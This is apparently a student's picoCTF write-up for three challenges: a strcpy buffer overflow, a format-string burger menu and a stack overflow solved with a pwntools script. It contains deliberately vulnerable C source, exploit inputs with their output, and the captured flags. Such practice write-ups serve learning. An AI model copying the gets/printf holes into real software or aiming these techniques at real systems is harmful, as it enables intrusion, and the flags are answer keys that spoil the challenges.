# 1. Binary overflow 0:

Let's start off simple, can you overflow the correct buffer?  
Connect using: nc saturn.picoctf.net 57136
```
C code given:

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```
## Solution:

From the name of the challenge, we can identify that we have to do buffer overflow. In the source code of the program, which was in C, one of the array had a size of 16, so we had to enter a input which had greater
than 16 characters, which will cause an overflow, and give us the flag. 

```
saltycoder@LAPTOP-LP81GQQE:~$ nc saturn.picoctf.net 57136
Input: 12
The program will exit now
^C
saltycoder@LAPTOP-LP81GQQE:~$ nc saturn.picoctf.net 57136
Input: ssssssssssssssssssssssss
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## Flag:

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## Concepts learnt:

- I learnt about buffer overflow, which is when we overflow the stack by overflowing one of the variable and exploit the program to our advantage. 

## Notes:

I first tried running the commands directly on vs code terminal, but realised it is a Linux command, so we have to run it on a Linix command line. 

## Resources:

https://ctf101.org/binary-exploitation/buffer-overflow/

https://youtube.com/watch?v=CRTR5ljBjPM

***

# 2. Format string 0: 

Can you use your knowledge of format strings to make the customers happy? Connect with the challenge instance here:
```
nc mimas.picoctf.net 56375
```
C code that was given: 
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 32
#define FLAGSIZE 64

char flag[FLAGSIZE];

void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}

int on_menu(char *burger, char *menu[], int count) {
    for (int i = 0; i < count; i++) {
        if (strcmp(burger, menu[i]) == 0)
            return 1;
    }
    return 0;
}

void serve_patrick();

void serve_bob();


int main(int argc, char **argv){
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    signal(SIGSEGV, sigsegv_handler);

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    serve_patrick();
  
    return 0;
}

void serve_patrick() {
    printf("%s %s\n%s\n%s %s\n%s",
            "Welcome to our newly-opened burger place Pico 'n Patty!",
            "Can you help the picky customers find their favorite burger?",
            "Here comes the first customer Patrick who wants a giant bite.",
            "Please choose from the following burgers:",
            "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice1[BUFSIZE];
    scanf("%s", choice1);
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        int count = printf(choice1);
        if (count > 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf("%s\n%s\n",
                    "Patrick is still hungry!",
                    "Try to serve him something of larger size!");
            fflush(stdout);
        }
    }
}

void serve_bob() {
    printf("\n%s %s\n%s %s\n%s %s\n%s",
            "Good job! Patrick is happy!",
            "Now can you serve the second customer?",
            "Sponge Bob wants something outrageous that would break the shop",
            "(better be served quick before the shop owner kicks you out!)",
            "Please choose from the following burgers:",
            "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice2[BUFSIZE];
    scanf("%s", choice2);
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2);
        fflush(stdout);
    }
}
```

## Solution:

This challenge, from its name was mainly about format specifiers in C like "%s", "%d", etc. They aksed us to enter recommendationn from a list and we have to select the one which had C format specifiers since the source code is in C. It was straightforward and after we enter two recommendations correctly, we will get the flag.

```
Terminal output:

Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```

## Flag:

```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```

## Concepts learnt:

- I learnt about format specifiers in C, which is used to tell the compiler about the type of data to be printed or scanned in input and output operations. It can be exploited if the code dosen't have proper format specifiers. 



## Resources:

https://www.geeksforgeeks.org/c/format-specifiers-in-c/

***

# 3. clutter overflow
Clutter, clutter everywhere and not a byte to use.
nc mars.picoctf.net 31890

## Solution:
- so one of the main vulnerabilities in this file is the gets commands which takes the input of the clutter and even in the manual of gets the biggest bug is that it takes more input than the required or designed size and can lead to overflow so first i try out by typing random characters and the code always prints out 0 as initiated.
- so to understand this more i tried exploring stack as it was one aspect (more in concepts) where the variables are stored so first code is initiated so the bottom part goes to code of 8 bytes followed by the character array clutter which holds 256 bytes and when we input more than 256 bytes like seen in the terminal prompt below the code value is the value of characters of ascii converted to hexa decimal in the reverse order so now our goal is to use this and make the value of code equal to deadbeef.
- so now at first i typed out 256 a's and saw that the python code value returned 0 and the same happend for 264 characters as a well so then after some searching i searched up learn about some form of cover which is of 8 bytes and when i typed 264 a's and random characters and observed that the ascii value of the characters was converted to hex and printed in the reverse order but for us to make code equal to deadbeaf.
- i spent researching about pwn tools and understood they are tools that are used in ctfs so then i prepared a script using resources where i read the message printed by the server and then sent an input which consists of 264 a's and then deadbeef encoded in the raw byte form which eventually prints the flag

```
My room is so cluttered...
What do you see?
123456
code == 0x0
code != 0xdeadbeef :(

My room is so cluttered...
What do you see?
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaqwert
code == 0x7472657771
code != 0xdeadbeef :(

from pwn import *

nc_connection = remote('mars.picoctf.net', 31890)

limit = b'A' * 264
value_code = p64(0xdeadbeef)
final_input = limit + value_code

log.info("Receiving information")
nc_connection.recvuntil(b'What do you see?')

log.info("Sending the input")
nc_connection.sendline(final_input)

log.success("output sent.")
nc_connection.interactive()
```


## Flag:

```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```
## Concepts learnt:
- read the manual and gets and fgets and we can see that fgets reads one characters less than the value set because fgets gets terminated by the /0 byte is stored in the last character of the buffer
- each byte is represeted by two hex characters and the system reads files the other way around and the slash tells the terminal to read them as actual characters, as raw binary data and not as ascii values
- i learnt a lot about pwn tools and how each individual command is helpful for communication with the server and many individual commands listen in the docs below.

## Resources:
- https://www.geeksforgeeks.org/computer-organization-architecture/memory-stack-organization-in-computer-architecture
- https://www.geeksforgeeks.org/compiler-design/storage-allocation-strategies-in-compiler-design
- https://docs.pwntools.com/en/stable/about.html
- https://github.com/Gallopsled/pwntools

